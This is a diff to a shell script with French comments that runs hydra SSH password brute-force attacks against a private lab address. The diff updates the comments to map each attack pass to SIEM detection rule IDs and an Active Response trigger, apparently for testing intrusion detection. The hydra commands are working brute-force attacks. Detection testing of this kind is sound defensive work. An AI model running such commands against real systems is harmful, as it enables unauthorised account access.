@@ -6,10 +6,10 @@ set -euo pipefail
 
 TARGET="192.168.159.20"
 
-# Passe 1 : utilisateur inexistant -> règle 5710
+# Passe 1 : utilisateur inexistant -> 5710 -> 5712 -> 100110
 hydra -l nexistepas -P passlist.txt -t 4 "ssh://${TARGET}"
 
-# Passe 2 : compte valide, mauvais mots de passe -> règle 5716
+# Passe 2 : compte existant, mauvais mots de passe -> 5760 -> 5763 -> 100120 (déclenche aussi l'Active Response)
 hydra -l amin -P passlist.txt -t 4 "ssh://${TARGET}"
 
 # Variante volume réaliste (rockyou, à décompresser au préalable) :
